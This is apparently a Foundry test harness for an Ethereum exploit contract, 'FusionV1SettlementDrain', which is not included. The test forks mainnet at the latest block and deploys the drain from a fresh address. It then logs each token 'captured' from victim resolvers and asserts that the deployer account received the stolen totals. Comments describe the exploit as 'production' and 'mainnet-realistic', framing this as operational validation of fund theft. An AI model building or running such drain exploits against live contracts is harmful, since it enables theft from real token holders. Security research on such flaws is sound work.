// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {FusionV1SettlementDrain} from "../src/FusionV1SettlementDrain.sol";

interface IERC20B {
    function balanceOf(address) external view returns (uint256);
}

/// Harness for the production single-file constructor exploit.
/// Only the fork setup is a cheatcode; the deployed exploit contract itself is
/// mainnet-realistic (no cheatcodes, no overrides).
contract FusionDrainTest is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function _strip(string memory s) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        uint256 start = 0;
        uint256 end = b.length;
        while (start < end) {
            bytes1 c = b[start];
            if (c == 0x22 || c == 0x27 || c == 0x20 || c == 0x0a || c == 0x0d || c == 0x09) start++;
            else break;
        }
        while (end > start) {
            bytes1 c = b[end - 1];
            if (c == 0x22 || c == 0x27 || c == 0x20 || c == 0x0a || c == 0x0d || c == 0x09) end--;
            else break;
        }
        bytes memory out = new bytes(end - start);
        for (uint256 i = start; i < end; i++) out[i - start] = b[i];
        return string(out);
    }

    function _cleanEnv(string memory name) internal view returns (string memory) {
        return _strip(vm.envOr(name, string("")));
    }

    function _rpc() internal view returns (string memory) {
        string memory r = _cleanEnv("BLOCKPI_RPC_URL");
        if (bytes(r).length > 0) return r;
        r = _cleanEnv("NODEREAL_ETH_RPC_URL");
        if (bytes(r).length > 0) return r;
        r = _cleanEnv("FORK_RPC_URL");
        if (bytes(r).length > 0) return r;
        r = _cleanEnv("RPC_URL");
        if (bytes(r).length > 0) return r;
        return "https://ethereum-rpc.publicnode.com";
    }

    function test_production_drain_latest_block() public {
        vm.createSelectFork(_rpc()); // latest block, no pin

        address deployer = makeAddr("c23-production-deployer");
        vm.deal(deployer, 1 ether); // harness-only: fund the fresh EOA
        uint256 g0 = gasleft();
        vm.recordLogs();
        vm.prank(deployer);
        new FusionV1SettlementDrain{value: 100 wei}();
        uint256 gasUsed = g0 - gasleft();

        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("Captured(address,address,uint256)");

        // pass 1: sum expected amounts per token (a token can be captured from
        // more than one victim)
        address[] memory seen = new address[](logs.length);
        uint256[] memory expected = new uint256[](logs.length);
        uint256 unique;
        uint256 count;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] != sig) continue;
            address victim = address(uint160(uint256(logs[i].topics[1])));
            address token = address(uint160(uint256(logs[i].topics[2])));
            uint256 amount = abi.decode(logs[i].data, (uint256));
            count++;
            bool found;
            for (uint256 j = 0; j < unique; j++) {
                if (seen[j] == token) {
                    expected[j] += amount;
                    found = true;
                    break;
                }
            }
            if (!found) {
                seen[unique] = token;
                expected[unique] = amount;
                unique++;
            }
            emit log_named_address("captured token", token);
            emit log_named_uint("  amount", amount);
            emit log_named_address("  from victim", victim);
        }

        // pass 2: the deployer EOA holds exactly the captured totals
        uint256 totalCheck;
        for (uint256 j = 0; j < unique; j++) {
            uint256 got = IERC20B(seen[j]).balanceOf(deployer);
            assertEq(got, expected[j], "deployer did not receive the captured amount");
            totalCheck += got;
        }

        emit log_named_uint("captured positions", count);
        emit log_named_uint("unique tokens", unique);
        emit log_named_uint("constructor gas used", gasUsed);
        emit log_named_uint("sum of raw amounts", totalCheck);
        assertGt(count, 0, "no resolver token captured at the latest block");
    }
}
